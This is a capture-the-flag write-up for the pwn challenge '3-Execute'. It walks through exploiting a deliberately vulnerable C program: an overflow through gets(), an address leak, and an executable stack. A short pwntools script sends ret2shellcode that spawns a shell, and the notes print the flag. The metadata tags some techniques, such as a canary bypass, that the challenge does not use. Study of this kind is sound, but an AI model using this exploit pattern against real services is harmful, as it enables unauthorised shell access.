---
title: "3-Execute"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 250
techniques: ["format-string", "ret2libc", "rop", "shellcode", "stack-canary", "pie-bypass", "nx-bypass", "encoding"]
tools: ["pwntools", "python"]
keywords: ["3-Execute", "Pwny-CTF", "pwn", "format-string", "ret2libc", "rop", "shellcode", "stack-canary", "pie-bypass", "nx-bypass", "encoding", "pwntools", "python", "hex", "canary", "aslr"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/PWN-II/3-Execute/notes.md"
---

# 3-Execute (Pwny-CTF, pwn)

## Summary
Challenge **3-Execute** from the Pwny-CTF CTF, pwn category. Main technique: format-string. Executable stack (-z execstack / RWX) + buffer address leak -> ret2shellcode.

## Statement and artefacts
Can you pwn this problem? Look at the challenge.c and pwn writeup for hints!

Code (challenge.c):
  int main() {
      char name[32];
      printf("... keeping it at %p\n", &name);   // LEAK the address of name
      gets(name);                                 // overflow, no win function
      puts("Wow, what a tale!");
  }
  // No "win" function, BUT the stack is EXECUTABLE (-z execstack).
  // -> ret2shellcode: put shellcode in name, overwrite the return address with &name (leaked).

Build: gcc -O0 -fno-stack-protector -no-pie -z execstack (No PIE, NX DISABLED, no canary).

**Provided files / artifacts:**
- `Dockerfile (file, 629 B)`
- `Makefile (file, 140 B)`
- `challenge (file, 18.5 KB)`
- `challenge_patched (file, 18.5 KB)`

## Recognition signals
- If we look at Build -z execstack, think of executable stack, -no-pie, no canary.
- Signal: No "win" function -> we write our own code (shellcode) in name and jump to it.
- If we observe recvall(timeout=1), think about waiting for the EOF, breaks the pipe -> sl crashes in EOFError.
- Signal: Use recvline().
- Signal: Address sent in ASCII (hex(.).encode() = b"0x7ff.") instead of p64(int) (8 little-endian bytes).
- If we observe Offset: shellcode + "A"*(32-23) = 32 only fills name, thinking about the address falls on the saved RBP.

## Resolution method
1. Read the leak (`recvline`, NOT `recvall` which breaks the connection) → `name_addr` (address of `name`, **already an int** via `leak_hex_int`).
2. Payload = `shellcode (23 B.)` + padding up to offset **40** (name[32] + saved RBP 8) + `p64(name_addr)`.
3. The return address = start of `name` = where is the shellcode → at `ret`, executing shellcode → `execve("/bin/sh")` → shell → `cat flag.txt`.

1. **Flaw**

```c
char name[32];
printf("... keeping it at %p\n", &name);   // LEAK of &name (bypasses ASLR)
gets(name);                                 // overflow, NO win function
```
Build `-z execstack` → **executable stack**, `-no-pie`, no canary. No "win" function → we write **our own code** (shellcode) in `name` and jump on it.

2. **Bugs encountered (script)**

1. `recvall(timeout=1)` → waits for EOF, breaks tube → `sl` crashes to `EOFError`. Use `recvline()`.
2. Address sent in **ASCII** (`hex(...).encode()` = b"0x7ff...") instead of **`p64(int)`** (8 little-endian bytes).
3. Offset: `shellcode + "A"*(32-23)` = 32 only fills `name` → the address falls on the saved RBP. You have to go to **40**.

## Discarded approaches
```python
from pwn import *
context.arch='amd64'
io=remote("chal.sigpwny.com",1390)
addr=int(io.recvline().split(b"at ")[1],16)
sc=asm(shellcraft.amd64.linux.sh())            # or hard shellcode (23 B.)
io.sendline(sc + b"A"*(40-len(sc)) + p64(addr))
io.interactive()
```

## Solve script
Script path: [scripts/pwny.py](scripts/pwny.py)

## Flag
sigpwny{shell_code_is_data_is_shell_code}

## Lessons and reusable patterns
- Executable stack (-z execstack / RWX) + buffer address leak -> ret2shellcode.
- Leaking a stack address cancels the ASLR for this run: use the SAME connection for leak + exploit.
- leak_hex_int returns int -> p64(int) directly (do not go through a string).
- NX activated would have prohibited this plan -> ROP/ret2libc would have been required.
